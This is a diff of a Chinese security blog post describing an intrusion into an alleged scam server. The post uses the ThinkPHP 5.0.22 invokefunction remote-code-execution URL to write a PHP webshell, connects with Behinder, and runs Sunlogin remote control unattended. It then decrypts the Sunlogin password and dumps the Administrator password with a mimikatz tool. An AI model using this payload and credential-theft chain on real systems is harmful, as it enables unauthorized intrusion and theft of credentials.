@@ -1,21 +1,25 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" href="/img/favicon.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
-  <meta name="author" content="VxerLee">
-  <meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"vxer-lee.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
   <meta name="description" content="0x00 前言 任何渗透测试技术支持服务，都应该先拿到授权书后方可进行。  0x01 信息收集http:&#x2F;&#x2F;www.xxxx.cn&#x2F;login 1234567FrontFrame: Twitter Bootstrap,jQuery Sparklines,OWL Carousel,Font Awesome,JQuery:1.8.3,HTML5Widget: Access-ControlLangu">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透之从ThinkPHP漏洞到向日葵远控拿下诈骗服务器">
@@ -49,219 +53,183 @@
 <meta property="article:author" content="VxerLee">
 <meta property="article:tag" content="ThinkPHP漏洞">
 <meta property="article:tag" content="内网渗透">
-<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150536227-1656712009.png">
-  
-  <title>渗透之从ThinkPHP漏洞到向日葵远控拿下诈骗服务器 - Lee&#39;s Blog</title>
 
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+<link rel="canonical" href="https://vxer-lee.github.io/2021/06/02/WebSecurity/ThinkPHPAndSunHack/">
 
 
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
 
-  
-    
-    
-      
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
-    
-  
-
-  
-    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  <title>渗透之从ThinkPHP漏洞到向日葵远控拿下诈骗服务器 | Lee's Blog</title>
   
 
 
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
 
 
 
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
 
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
 
-<link  rel="stylesheet" href="/css/main.css" />
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
 
-<!-- 自定义样式保持在最底部 -->
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
 
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"vxer-lee.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Lee's Blog" type="application/atom+xml">
+<link rel="alternate" href="/atom.xml" title="Lee's Blog" type="application/atom+xml">
 </head>
 
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
 
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Fluid</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Lee's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">专注逆向、网络安全</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
 </nav>
 
-    <div class="banner" id="banner" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="渗透之从ThinkPHP漏洞到向日葵远控拿下诈骗服务器">
-              
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vxer-lee.github.io/2021/06/02/WebSecurity/ThinkPHPAndSunHack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="VxerLee">
+      <meta itemprop="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lee's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透之从ThinkPHP漏洞到向日葵远控拿下诈骗服务器
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-02 19:21:00" itemprop="dateCreated datePublished" datetime="2021-06-02T19:21:00+08:00">2021-06-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-16 15:59:32" itemprop="dateModified" datetime="2021-08-16T15:59:32+08:00">2021-08-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+                </span>
             </span>
 
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-06-02 19:21" pubdate>
-        2021年6月2日 晚上
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      undefined 字
-    </span>
-  
-
-  
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      NaN 分钟
-    </span>
-  
-
-  
-  
-</div>
-
-            
-          </div>
-
           
+
         </div>
-      </div>
-    </div>
-  </header>
+      </header>
 
-  <main>
     
-      
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">渗透之从ThinkPHP漏洞到向日葵远控拿下诈骗服务器</h1>
-            
-            <div class="markdown-body">
-              <meta name="referrer" content="no-referrer"/>
+      
+        <meta name="referrer" content="no-referrer"/>
 
 <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><blockquote>
 <p>任何渗透测试技术支持服务，都应该先拿到授权书后方可进行。</p>
@@ -271,19 +239,19 @@
 <p>没识别到相关的CMS组件信息，我们进行手动操作，随便输入点什么让服务器报错回显有关信息。<br>比如：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.cn&#x2F;apip.php</span><br><span class="line">回显：</span><br><span class="line">熟悉的面孔，thinkphp</span><br><span class="line">ThinkPHP V5.0.22 &#123; 十年磨一剑-为API开发设计的高性能框架 &#125; （ThinkPHP 5.0.22）</span><br><span class="line">THINK_PATH D:\phpStudy\PHPTutorial\WWW\xxx\thinkphp\ （Windows 服务器，phpStudy）</span><br><span class="line">Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j mod_fcgid&#x2F;2.3.9 （Apache）</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150536227-1656712009.png" srcset="/img/loading.gif" lazyload alt="1"> </p>
-<h2 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a>0x02 漏洞测试</h2><p>知道了对方用的CMS和框架后，可以尝试用漏洞测试工具对其进行测试。<br>ThinkPHP漏洞取证小助手一顿撸!<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150638444-2002532457.png" srcset="/img/loading.gif" lazyload alt="image-20210816150638045"><br>哦吼，返回404？？？？这是怎么回事呢？ 让我看看。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150805152-942618794.png" srcset="/img/loading.gif" lazyload alt="image-20210530145844566"><br>返回404说明主站的路径默认不在根目录，通过测试发现在public目录。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150815077-2116059478.png" srcset="/img/loading.gif" lazyload alt="image-20210530150052092"><br>我去访问WebShell的时候，返回了奇怪的错误提示模块不存在public，我想这应该是我的Shell1.php写到了后端根目录，即<code>phpStudy\www\xxx\shell1.php</code>，而网站管理员设置了只能访问前端目录即<code>nginx\html\dist-xx\index.html</code>，所以访问时候就会报错显示404 无法访问。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150917663-596583674.png" srcset="/img/loading.gif" lazyload alt="image-20210816150917217"><br>（实验了下，确实前后端目录分离，在前端img目录下写入404.txt可正常访问到。）<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151116360-810544006.png" srcset="/img/loading.gif" lazyload alt="image-20210531180824901"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151139779-938529109.png" srcset="/img/loading.gif" lazyload alt="image-20210531180846255"><br>解决方案：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150536227-1656712009.png" alt="1"> </p>
+<h2 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a>0x02 漏洞测试</h2><p>知道了对方用的CMS和框架后，可以尝试用漏洞测试工具对其进行测试。<br>ThinkPHP漏洞取证小助手一顿撸!<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150638444-2002532457.png" alt="image-20210816150638045"><br>哦吼，返回404？？？？这是怎么回事呢？ 让我看看。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150805152-942618794.png" alt="image-20210530145844566"><br>返回404说明主站的路径默认不在根目录，通过测试发现在public目录。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150815077-2116059478.png" alt="image-20210530150052092"><br>我去访问WebShell的时候，返回了奇怪的错误提示模块不存在public，我想这应该是我的Shell1.php写到了后端根目录，即<code>phpStudy\www\xxx\shell1.php</code>，而网站管理员设置了只能访问前端目录即<code>nginx\html\dist-xx\index.html</code>，所以访问时候就会报错显示404 无法访问。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150917663-596583674.png" alt="image-20210816150917217"><br>（实验了下，确实前后端目录分离，在前端img目录下写入404.txt可正常访问到。）<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151116360-810544006.png" alt="image-20210531180824901"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151139779-938529109.png" alt="image-20210531180846255"><br>解决方案：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#管理员配置了我们只能访问public目录，那我们就用绝对路径的方式找到public目录，并且写入一句话。</span><br><span class="line">#由ThinkPHP报错得知，public绝对路径如下</span><br><span class="line">PUBLIC_PATH  D:\phpStudy\PHPTutorial\WWW\xx\public\</span><br></pre></td></tr></table></figure>
-<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151221583-1867892045.png" srcset="/img/loading.gif" lazyload alt="image-20210530152452017"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151235114-111641459.png" srcset="/img/loading.gif" lazyload alt="image-20210530152606303"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151245322-1478852002.png" srcset="/img/loading.gif" lazyload alt="image-20210530152647511"><br>写入phpinfo</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151221583-1867892045.png" alt="image-20210530152452017"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151235114-111641459.png" alt="image-20210530152606303"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151245322-1478852002.png" alt="image-20210530152647511"><br>写入phpinfo</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell1.php&amp;vars[1][]&#x3D;&lt;?phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
 <p>写入一句话</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(xxxxxxxxx); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x03-一句话Shell"><a href="#0x03-一句话Shell" class="headerlink" title="0x03 一句话Shell"></a>0x03 一句话Shell</h2><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151341165-695812818.png" srcset="/img/loading.gif" lazyload alt="image-20210530152920940"> </p>
+<h2 id="0x03-一句话Shell"><a href="#0x03-一句话Shell" class="headerlink" title="0x03 一句话Shell"></a>0x03 一句话Shell</h2><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151341165-695812818.png" alt="image-20210530152920940"> </p>
 <h2 id="0x04-冰蝎-内网渗透"><a href="#0x04-冰蝎-内网渗透" class="headerlink" title="0x04 冰蝎 内网渗透"></a>0x04 冰蝎 内网渗透</h2><p>冰蝎下载地址：<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11/Behinder_v3.0_Beta_11.t00ls.zip">https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11/Behinder_v3.0_Beta_11.t00ls.zip</a><br>冰蝎 一句话Shell</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">......</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>运行冰蝎</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure>
-<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151357371-102688335.png" srcset="/img/loading.gif" lazyload alt="image-20210530154310972"><br>服务器信息收集：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151357371-102688335.png" alt="image-20210530154310972"><br>服务器信息收集：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用来查看开了哪些进程，一般判断有哪些防火墙、杀毒软件</span></span><br><span class="line">tasklist /SVC</span><br></pre></td></tr></table></figure>
 <p>将结果复制到这个网站中进行过滤<a target="_blank" rel="noopener" href="https://maikefee.com/av_list">https://maikefee.com/av_list</a></p>
 <h2 id="0x05-向日葵远控组合拳"><a href="#0x05-向日葵远控组合拳" class="headerlink" title="0x05 向日葵远控组合拳"></a>0x05 向日葵远控组合拳</h2><p>工具目录：</p>
@@ -293,183 +261,203 @@
 <li>new_mimi.exe 读取服务器密码</li>
 <li>de_sun.exe 向日葵密码解密工具 (这个可以不用上传到远程服务器)</li>
 </ul>
-<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151421989-42248780.png" srcset="/img/loading.gif" lazyload alt="image-20210530165312741"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151421989-42248780.png" alt="image-20210530165312741"> </p>
 <p>将文件上传到 <code>C:/xxx/xxx/</code>目录<br>然后分别运行如下命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/xxx/xxx/&gt; ggg.exe  <span class="comment">#让向日葵以绿色模式运行，无须安装</span></span><br><span class="line">C:/xxx/xxx/&gt; sun.exe  <span class="comment">#运行向日葵</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>重要！！！</p>
 <p>向注册表中写入向日葵安装信息成功，运行向日葵后无须安装。</p>
 </blockquote>
-<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151431381-744914.png" srcset="/img/loading.gif" lazyload alt="image-20210530165806676"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151431381-744914.png" alt="image-20210530165806676"> </p>
 <blockquote>
 <p>运行sun.exe 向日葵后，会在C:\ProgramData目录多出一个Oray目录（向日葵配置信息）。</p>
-<p>下载向日葵配置文件C:/ProgramData/Oray/SunloginClient/config.ini<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151447218-1031169864.png" srcset="/img/loading.gif" lazyload alt="image-20210530170038380"><br>解析向日葵配置文件，提取验证码和密码</p>
+<p>下载向日葵配置文件C:/ProgramData/Oray/SunloginClient/config.ini<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151447218-1031169864.png" alt="image-20210530170038380"><br>解析向日葵配置文件，提取验证码和密码</p>
 <p>验证码：xxxxx</p>
-<p>密码（加密）：gxfhaBnFFlQ=<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151507031-444365686.png" srcset="/img/loading.gif" lazyload alt="image-20210530170228194"><br>在本机运行de_sun.exe，解密向日葵密码<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151557977-3317338.png" srcset="/img/loading.gif" lazyload alt="image-20210530170417329"><br>向日葵</p>
+<p>密码（加密）：gxfhaBnFFlQ=<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151507031-444365686.png" alt="image-20210530170228194"><br>在本机运行de_sun.exe，解密向日葵密码<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151557977-3317338.png" alt="image-20210530170417329"><br>向日葵</p>
 <p>伙伴识别码：xxxxx</p>
 <p>验证码：Tlm3S0</p>
 </blockquote>
-<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151609868-742170837.png" srcset="/img/loading.gif" lazyload alt="image-20210530170552978"><br>成功连接上了远程服务器的向日葵，但是需要账号密码解锁！<br>上传组合拳里面的 new_mimi.exe 到远程服务器，运行如下命令</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151609868-742170837.png" alt="image-20210530170552978"><br>成功连接上了远程服务器的向日葵，但是需要账号密码解锁！<br>上传组合拳里面的 new_mimi.exe 到远程服务器，运行如下命令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/xxx/xxx/ &gt;new_mimi.exe</span><br></pre></td></tr></table></figure>
-<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151620028-226874935.png" srcset="/img/loading.gif" lazyload alt="image-20210530170737867"><br>提取出账号密码</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151620028-226874935.png" alt="image-20210530170737867"><br>提取出账号密码</p>
 <blockquote>
 <p>远程服务器账号密码信息</p>
 <p>Username : Administrator<br>Domain   :<br>Password : 12345678911</p>
 </blockquote>
-<h2 id="0x06-利用成功"><a href="#0x06-利用成功" class="headerlink" title="0x06 利用成功"></a>0x06 利用成功</h2><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151636040-1318970692.png" srcset="/img/loading.gif" lazyload alt="image-20210530170923013"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151650462-1434249605.png" srcset="/img/loading.gif" lazyload alt="image-20210530171012224"><br>：)可以看到管理员在偷偷看注册的用户信息，我确认了服务器管理员不在操作，于是进行了进一步取证，得到了管理员的真实ip地址，上面还有一个百度网盘，里面有管理员的账号信息，接下来就是将信息交给警察叔叔处理吧。</p>
+<h2 id="0x06-利用成功"><a href="#0x06-利用成功" class="headerlink" title="0x06 利用成功"></a>0x06 利用成功</h2><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151636040-1318970692.png" alt="image-20210530170923013"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151650462-1434249605.png" alt="image-20210530171012224"><br>：)可以看到管理员在偷偷看注册的用户信息，我确认了服务器管理员不在操作，于是进行了进一步取证，得到了管理员的真实ip地址，上面还有一个百度网盘，里面有管理员的账号信息，接下来就是将信息交给警察叔叔处理吧。</p>
 
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/ThinkPHP%E6%BC%8F%E6%B4%9E/">ThinkPHP漏洞</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">
-                  
-                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
-                  
-                </p>
-              
-              
-                <div class="post-prevnext">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2021/08/05/IoTSecurity/IoT-vulhub/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">路由器漏洞环境仿真</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2020/11/13/Forensics/mimikatz/">
-                        <span class="hidden-mobile">Mimikatz离线破解Windows登陆密码</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
     </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
